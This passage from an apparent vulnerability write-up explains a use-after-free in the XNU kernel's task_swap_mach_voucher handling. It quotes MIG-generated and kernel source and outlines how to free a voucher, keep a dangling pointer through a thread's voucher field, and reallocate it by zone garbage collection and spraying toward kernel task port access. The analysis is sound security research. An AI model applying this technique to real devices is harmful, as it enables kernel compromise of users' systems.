    <span class="mi">4839</span><span class="o">:</span> 	<span class="n">new_voucher</span> <span class="o">=</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4840</span><span class="o">:</span> 
    <span class="mi">4841</span><span class="o">:</span> 	<span class="n">old_voucher</span> <span class="o">=</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4842</span><span class="o">:</span> 
    <span class="mi">4843</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">new_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old_voucher</span><span class="p">);</span>
    <span class="mi">4844</span><span class="o">:</span> 	<span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">new_voucher</span><span class="p">);</span>
    <span class="mi">4845</span><span class="o">:</span> 	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">4846</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">4847</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">4848</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">4849</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">4850</span><span class="o">:</span> 
    <span class="mi">4851</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
    <span class="mi">4852</span><span class="o">:</span> 		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4853</span><span class="o">:</span> 
    <span class="mi">4854</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
    <span class="mi">4855</span><span class="o">:</span> 		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4856</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">4857</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">old_voucher</span><span class="p">);</span>
    <span class="mi">4858</span><span class="o">:</span> 
    <span class="mi">4859</span><span class="o">:</span> </code></pre></figure>

<p>Here are the reference count changes.</p>

<pre>	**Line 4839: Reference count of new_voucher + 1**

	**Line 4841: Reference count of old_voucher + 1**

	**Line 4843: task_swap_mach_voucher called -&gt; old_voucher = new_voucher**

	**Line 4844: Reference count of new_voucher - 1**

	**Line 4857: Reference count of new_voucher - 1 (Because old_voucher is now new_voucher)**

</pre>

<p>I think you are starting to see the problem here. The reference count of <strong>new_voucher</strong> can be reduced to 0 thereby freeing the object. And the reference count of <strong>old_voucher</strong> can be increased by too many. As discussed before, the reference count overflow has been protected by the max cap value of <strong>0x0fffffff</strong>.</p>

<p>So it is possible to get a dangling pointer pointing to a voucher. This can be done by storing a pointer to the voucher, and then using the vulnerability to reduce the reference count of the voucher to 0, which will free the voucher.</p>

<p><img src="/images/11b.png" alt="11" /></p>

<h3 id="about-vouchers">About Vouchers</h3>

<p>Before proceeding, it is always good idea to look at the object struct and understand the different fields in it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">63</span><span class="o">:</span> <span class="cm">/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */</span>
    <span class="mi">70</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_voucher</span> <span class="p">{</span>
    <span class="mi">71</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_hash</span><span class="p">;</span>	<span class="cm">/* checksum hash */</span>
    <span class="mi">72</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_sum</span><span class="p">;</span>		<span class="cm">/* checksum of values */</span>
    <span class="mi">73</span><span class="o">:</span> 	<span class="n">os_refcnt_t</span>		<span class="n">iv_refs</span><span class="p">;</span>	<span class="cm">/* reference count */</span>
    <span class="mi">74</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_table_size</span><span class="p">;</span>	<span class="cm">/* size of the voucher table */</span>
    <span class="mi">75</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_inline_table</span><span class="p">[</span><span class="n">IV_ENTRIES_INLINE</span><span class="p">];</span>
    <span class="mi">76</span><span class="o">:</span> 	<span class="n">iv_entry_t</span>		<span class="n">iv_table</span><span class="p">;</span>	<span class="cm">/* table of voucher attr entries */</span>
    <span class="mi">77</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">iv_port</span><span class="p">;</span>	<span class="cm">/* port representing the voucher */</span>
    <span class="mi">78</span><span class="o">:</span> 	<span class="n">queue_chain_t</span>		<span class="n">iv_hash_link</span><span class="p">;</span>	<span class="cm">/* link on hash chain */</span>
    <span class="mi">79</span><span class="o">:</span> <span class="p">};</span></code></pre></figure>

<p>So the first thing is to identify which object to store the pointer for the freed voucher in. The best way for this is to search for <strong>ipc_voucher_t</strong> in the kernel source, and look for APIs that easily allow getting and setting of that pointer. One of the places which stands out is in the thread object inside <strong>osfmk/kern/thread.h</strong> which stores the voucher reference with the name <strong>ith_voucher</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="kr">thread</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">570</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">571</span><span class="o">:</span> 	<span class="n">task_watch_t</span> <span class="o">*</span>	<span class="n">taskwatch</span><span class="p">;</span>		<span class="cm">/* task watch */</span>
    <span class="mi">572</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_EMBEDDED */</span>
    <span class="mi">573</span><span class="o">:</span> 
    <span class="mi">574</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_callout_interrupt_wakeups</span><span class="p">;</span>
    <span class="mi">575</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_callout_platform_idle_wakeups</span><span class="p">;</span>
    <span class="mi">576</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_timer_wakeups_bin_1</span><span class="p">;</span>
    <span class="mi">577</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_timer_wakeups_bin_2</span><span class="p">;</span>
    <span class="mi">578</span><span class="o">:</span> 	<span class="kt">uint16_t</span>			<span class="n">thread_tag</span><span class="p">;</span>
    <span class="mi">579</span><span class="o">:</span> 	<span class="kt">uint16_t</span>			<span class="n">callout_woken_from_icontext</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">580</span><span class="o">:</span> 					<span class="n">callout_woken_from_platform_idle</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">581</span><span class="o">:</span> 					<span class="n">callout_woke_thread</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">582</span><span class="o">:</span> 					<span class="n">thread_bitfield_unused</span><span class="o">:</span><span class="mi">13</span><span class="p">;</span>
    <span class="mi">583</span><span class="o">:</span> 
    <span class="mi">584</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>		<span class="n">ith_voucher_name</span><span class="p">;</span>
    <span class="mi">585</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>			<span class="n">ith_voucher</span><span class="p">;</span>
    <span class="mi">586</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_IOSCHED</span>
    <span class="mi">587</span><span class="o">:</span> 	<span class="kt">void</span> 				<span class="o">*</span><span class="n">decmp_upl</span><span class="p">;</span>
    <span class="mi">588</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_IOSCHED */</span>
    <span class="mi">589</span><span class="o">:</span> </code></pre></figure>

<p>The functions <strong>thread_get_mach_voucher</strong> and <strong>thread_set_mach_voucher</strong> can be used to read and write the voucher reference from userland. Again, as we recall from part 1, we need to look at the <strong>MIG</strong> generated code for this function.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">thread_act_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2597</span><span class="o">:</span> <span class="cm">/* Routine thread_get_mach_voucher */</span>
    <span class="mi">2598</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xthread_get_mach_voucher</span>
    <span class="mi">2599</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">2600</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2601</span><span class="o">:</span> 
    <span class="mi">2602</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2603</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2604</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2605</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2606</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2607</span><span class="o">:</span> 		<span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">2608</span><span class="o">:</span> 		<span class="n">mach_voucher_selector_t</span> <span class="n">which</span><span class="p">;</span>
    <span class="mi">2609</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">2610</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2614</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__thread_get_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">2615</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__thread_get_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2616</span><span class="o">:</span> 
    <span class="mi">2617</span><span class="o">:</span> 	<span class="cm">/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */</span>
    <span class="mi">2624</span><span class="o">:</span> 

    <span class="mi">2686</span><span class="o">:</span> 	<span class="n">thr_act</span> <span class="o">=</span> <span class="n">convert_port_to_thread</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">2687</span><span class="o">:</span> 
    <span class="mi">2688</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="n">thr_act</span><span class="p">,</span> <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">which</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2689</span><span class="o">:</span> 	<span class="n">thread_deallocate</span><span class="p">(</span><span class="n">thr_act</span><span class="p">);</span>
    <span class="mi">2690</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2691</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">2692</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">2695</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2702</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>Once we get a dangling pointer to a freed voucher object, we can then reallocate the freed voucher object with something else. However, this is not straightforward. Vouchers typically reside in their own zone <strong>ipc vouchers</strong> as can be seen in <strong>osfmk/ipc/ipc_voucher.c</strong> where the <strong>zinit</strong> call allocates a new zone for the vouchers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">198</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">199</span><span class="o">:</span> <span class="n">ipc_voucher_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
    <span class="mi">200</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">201</span><span class="o">:</span> 	<span class="n">natural_t</span> <span class="n">ipc_voucher_max</span> <span class="o">=</span> <span class="p">(</span><span class="n">task_max</span> <span class="o">+</span> <span class="n">thread_max</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
    <span class="mi">202</span><span class="o">:</span> 	<span class="n">natural_t</span> <span class="n">attr_manager_max</span> <span class="o">=</span> <span class="n">MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN</span><span class="p">;</span>
    <span class="mi">203</span><span class="o">:</span> 	<span class="n">iv_index_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="mi">204</span><span class="o">:</span> 
    <span class="mi">205</span><span class="o">:</span> 	<span class="n">ipc_voucher_zone</span> <span class="o">=</span> <span class="n">zinit</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">206</span><span class="o">:</span> 				 <span class="n">ipc_voucher_max</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">207</span><span class="o">:</span> 				 <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">208</span><span class="o">:</span> 				 <span class="s">"ipc vouchers"</span><span class="p">);</span>
    <span class="mi">209</span><span class="o">:</span> 	<span class="n">zone_change</span><span class="p">(</span><span class="n">ipc_voucher_zone</span><span class="p">,</span> <span class="n">Z_NOENCRYPT</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
    <span class="mi">210</span><span class="o">:</span> 
    <span class="mi">211</span><span class="o">:</span> 	
    <span class="mi">216</span><span class="o">:</span> </code></pre></figure>

<p>So the freed memory for the voucher will be placed in the freelist of the zone and allocated to a new voucher when it is created. Therefore in order to reallocate with some other object, the only feasible way is to initiate zone garbage collection which will move the freed memory for the vouchers (min size is 1 page which includes the freed voucher) into the zone map and then reallocate that memory with something else. Zone garbage collection can be triggered by allocating a large number of vouchers and freeing them, making that memory available for next allocation and then spraying via port pointers as we will see later in this article.</p>

<p>Let’s look closely at <strong>thread_get_mach_voucher</strong> in <strong>MIG</strong> generated code again. Assuming we did reallocate the freed voucher with some object, the call <strong>thread_get_mach_voucher</strong> should succeed without panicking the kernel, since we are interested in <strong>tfp0</strong> eventually and not really kernel panics. The function <strong>thread_get_mach_voucher</strong> inside the kernel which is called on Line 2688 calls <strong>ipc_voucher_reference(voucher)</strong> , which should mean that the <strong>iv_refs</strong> field should be valid for the voucher.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">thread_act_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2597</span><span class="o">:</span> <span class="cm">/* Routine thread_get_mach_voucher */</span>
    <span class="mi">2598</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xthread_get_mach_voucher</span>
    <span class="mi">2599</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">2600</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2601</span><span class="o">:</span> 
    <span class="mi">2602</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2603</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2604</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2605</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2606</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2607</span><span class="o">:</span> 		<span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">2608</span><span class="o">:</span> 		<span class="n">mach_voucher_selector_t</span> <span class="n">which</span><span class="p">;</span>
    <span class="mi">2609</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">2610</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2611</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2612</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">2613</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2614</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__thread_get_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">2615</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__thread_get_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2616</span><span class="o">:</span> 
    <span class="mi">2617</span><span class="o">:</span> 	<span class="cm">/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */</span>
    <span class="mi">2624</span><span class="o">:</span> 
    <span class="mi">2625</span><span class="o">:</span> 	<span class="n">Request</span> <span class="o">*</span><span class="n">In0P</span> <span class="o">=</span> <span class="p">(</span><span class="n">Request</span> <span class="o">*</span><span class="p">)</span> <span class="n">InHeadP</span><span class="p">;</span>
    <span class="mi">2626</span><span class="o">:</span> 	<span class="n">Reply</span> <span class="o">*</span><span class="n">OutP</span> <span class="o">=</span> <span class="p">(</span><span class="n">Reply</span> <span class="o">*</span><span class="p">)</span> <span class="n">OutHeadP</span><span class="p">;</span>
    <span class="mi">2627</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>	<span class="n">__MIG_check__Request__thread_get_mach_voucher_t__defined</span>
    <span class="mi">2628</span><span class="o">:</span> 	<span class="n">kern_return_t</span> <span class="n">check_result</span><span class="p">;</span>
    <span class="mi">2629</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MIG_check__Request__thread_get_mach_voucher_t__defined */</span>
    <span class="mi">2630</span><span class="o">:</span> 
    <span class="mi">2631</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2632</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2633</span><span class="o">:</span> 	<span class="k">const</span> <span class="k">static</span> <span class="n">mach_msg_port_descriptor_t</span> <span class="n">voucherTemplate</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">2634</span><span class="o">:</span> 		<span class="cm">/* name = */</span>		<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    <span class="mi">2635</span><span class="o">:</span> 		<span class="cm">/* pad1 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2636</span><span class="o">:</span> 		<span class="cm">/* pad2 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2637</span><span class="o">:</span> 		<span class="cm">/* disp = */</span>		<span class="mi">17</span><span class="p">,</span>
    <span class="mi">2638</span><span class="o">:</span> 		<span class="cm">/* type = */</span>		<span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">,</span>
    <span class="mi">2639</span><span class="o">:</span> 	<span class="p">};</span>
    <span class="mi">2640</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2641</span><span class="o">:</span> 
    <span class="mi">2642</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">2643</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2644</span><span class="o">:</span> 	<span class="k">const</span> <span class="k">static</span> <span class="n">mach_msg_port_descriptor_t</span> <span class="n">voucherTemplate</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">2645</span><span class="o">:</span> 		<span class="cm">/* name = */</span>		<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    <span class="mi">2646</span><span class="o">:</span> 		<span class="cm">/* pad1 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2647</span><span class="o">:</span> 		<span class="cm">/* pad2 = */</span>		<span class="mi">0</span><span class="p">,</span>
    <span class="mi">2648</span><span class="o">:</span> 		<span class="cm">/* disp = */</span>		<span class="mi">19</span><span class="p">,</span>
    <span class="mi">2649</span><span class="o">:</span> 		<span class="cm">/* type = */</span>		<span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">,</span>
    <span class="mi">2650</span><span class="o">:</span> 	<span class="p">};</span>
    <span class="mi">2651</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2652</span><span class="o">:</span> 
    <span class="mi">2653</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2654</span><span class="o">:</span> 	<span class="n">kern_return_t</span> <span class="n">RetCode</span><span class="p">;</span>
    <span class="mi">2655</span><span class="o">:</span> 	<span class="n">thread_act_t</span> <span class="n">thr_act</span><span class="p">;</span>
    <span class="mi">2656</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">;</span>
    <span class="mi">2657</span><span class="o">:</span> 
    <span class="mi">2658</span><span class="o">:</span> 	<span class="n">__DeclareRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2659</span><span class="o">:</span> 	<span class="n">__BeforeRcvRpc</span><span class="p">(</span><span class="mi">3625</span><span class="p">,</span> <span class="s">"thread_get_mach_voucher"</span><span class="p">)</span>
    <span class="mi">2660</span><span class="o">:</span> 
    <span class="mi">2661</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">defined</span><span class="p">(</span><span class="n">__MIG_check__Request__thread_get_mach_voucher_t__defined</span><span class="p">)</span>
    <span class="mi">2662</span><span class="o">:</span> 	<span class="n">check_result</span> <span class="o">=</span> <span class="n">__MIG_check__Request__thread_get_mach_voucher_t</span><span class="p">((</span><span class="n">__Request</span> <span class="o">*</span><span class="p">)</span><span class="n">In0P</span><span class="p">);</span>
    <span class="mi">2663</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">check_result</span> <span class="o">!=</span> <span class="n">MACH_MSG_SUCCESS</span><span class="p">)</span>
    <span class="mi">2664</span><span class="o">:</span> 		<span class="p">{</span> <span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">check_result</span><span class="p">);</span> <span class="p">}</span>
    <span class="mi">2665</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* defined(__MIG_check__Request__thread_get_mach_voucher_t__defined) */</span>
    <span class="mi">2666</span><span class="o">:</span> 
    <span class="mi">2667</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">UseStaticTemplates</span>
    <span class="mi">2668</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span> <span class="o">=</span> <span class="n">voucherTemplate</span><span class="p">;</span>
    <span class="mi">2669</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>	<span class="cm">/* UseStaticTemplates */</span>
    <span class="mi">2670</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">__MigKernelSpecificCode</span>
    <span class="mi">2671</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
    <span class="mi">2672</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">2673</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
    <span class="mi">2674</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">2675</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="o">!</span><span class="p">(</span><span class="n">defined</span><span class="p">(</span><span class="n">KERNEL</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">defined</span><span class="p">(</span><span class="n">__LP64__</span><span class="p">))</span>
    <span class="mi">2676</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">2677</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2678</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">pad2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
